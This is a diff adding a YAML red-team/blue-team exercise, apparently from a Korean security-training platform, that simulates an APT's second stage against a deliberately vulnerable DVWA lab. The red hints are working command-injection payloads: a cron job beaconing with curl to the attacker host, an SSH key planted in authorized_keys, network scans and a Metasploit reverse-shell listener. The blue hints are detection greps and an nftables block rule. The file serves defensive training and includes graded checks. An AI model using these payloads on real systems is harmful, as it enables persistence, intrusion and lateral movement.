@@ -1,0 +1,134 @@
+id: "apt-phase2"
+title: "APT 2단계: 거점 확보 + 측면 이동"
+description: "APT 그룹이 초기 침투에 성공한 것으로 확인되었다. 2단계에서 Red Team은 지속성을 확보하고(cron, SSH key), 내부 네트워크를 정찰하며 다른 시스템으로 측면 이동해야 한다. Blue Team은 persistence 메커니즘을 탐지하고 새로운 cron 작업이나 SSH 키 추가를 실시간 알림으로 포착해야 한다."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "DVWA Command Injection을 통해 대상 시스템에 cron 작업을 등록하여 지속성을 확보하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;echo+\"*/5+*+*+*+*+curl+http://10.20.30.201:8888/beacon\"+|+crontab+-+2>&1&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 2
+    instruction: "Command Injection을 통해 SSH 공개키를 authorized_keys에 추가하는 것을 시도하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;mkdir+-p+~/.ssh;echo+ssh-rsa+AAAAB3test+attacker@apt+>>+~/.ssh/authorized_keys+2>&1&Submit=Submit'"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 3
+    instruction: "Command Injection으로 내부 네트워크 호스트를 ping 스캔하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;for+h+in+1+80+100+201;do+ping+-c1+-W1+10.20.30.$h+2>&1|grep+ttl;done&Submit=Submit'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "ttl"
+
+  - order: 4
+    instruction: "내부 SIEM 서버(10.20.30.100)에 대한 포트 스캔을 수행하여 접근 가능한 서비스를 확인하라."
+    hint: "nmap -sV -p 22,443,1514,1515,9200,55000 10.20.30.100 --max-retries 1 --host-timeout 15s -T4"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "open"
+
+  - order: 5
+    instruction: "Command Injection으로 대상 시스템의 네트워크 설정과 라우팅 테이블을 수집하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;ip+addr+show;ip+route+show&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 6
+    instruction: "Metasploit으로 리스너를 설정하여 리버스 셸 대기 상태를 만들어라."
+    hint: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 10.20.30.201; set LPORT 4444; show options; exit' 2>&1 | tail -20"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "LHOST"
+
+  - order: 7
+    instruction: "Command Injection으로 시스템의 실행 중인 서비스와 열린 포트를 열거하라."
+    hint: "curl -s 'http://10.20.30.80:8080/vulnerabilities/exec/' -b 'security=low; PHPSESSID=test' -d 'ip=127.0.0.1;ss+-tlnp+2>&1|head+-20&Submit=Submit'"
+    points: 10
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "LISTEN"
+
+blue_missions:
+  - order: 1
+    instruction: "웹 서버의 crontab을 점검하여 비인가 cron 작업이 추가되지 않았는지 확인하라."
+    hint: "crontab -l 2>/dev/null; for user in root www-data; do echo \"=== $user ===\"; crontab -u $user -l 2>/dev/null; done"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "==="
+
+  - order: 2
+    instruction: "모든 사용자의 authorized_keys 파일에 비인가 SSH 키가 추가되지 않았는지 점검하라."
+    hint: "find / -name authorized_keys -exec echo '=== {} ===' \\; -exec cat {} \\; 2>/dev/null"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "authorized_keys"
+
+  - order: 3
+    instruction: "Wazuh의 syscheck(파일 무결성 모니터링)에서 최근 파일 변경 알림을 확인하라."
+    hint: "grep -i 'syscheck' /var/ossec/logs/alerts/alerts.json | grep -iE 'cron\\|ssh\\|authorized' | tail -20"
+    points: 20
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 4
+    instruction: "Apache 접근 로그에서 Command Injection 공격 패턴을 탐지하라."
+    hint: "grep -iE 'exec|;|crontab|ssh|authorized_keys|ping' /var/log/apache2/access.log | tail -30"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "exec"
+
+  - order: 5
+    instruction: "suricata에서 내부 네트워크 정찰(ping sweep, port scan) 활동을 탐지하라."
+    hint: "grep -iE 'scan\\|icmp\\|ping' /var/log/suricata/fast.log | tail -20"
+    points: 10
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: "10.20.30"
+
+  - order: 6
+    instruction: "nftables에 Command Injection을 통한 아웃바운드 비컨 연결을 차단하라."
+    hint: "nft add rule inet filter output ip daddr 10.20.30.201 tcp dport { 4444, 8888 } drop"
+    points: 20
+    target_vm: secu
+    verify:
+      type: "output_contains"
+      expect: ""
+
+  - order: 7
+    instruction: "웹 서버에서 의심스러운 프로세스와 네트워크 연결을 확인하라."
+    hint: "ss -tnp | grep -v LISTEN | grep -E '4444|8888|ESTABLISHED' 2>/dev/null; ps aux | grep -iE 'nc |ncat|reverse|curl.*beacon' | grep -v grep"
+    points: 10
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: ""
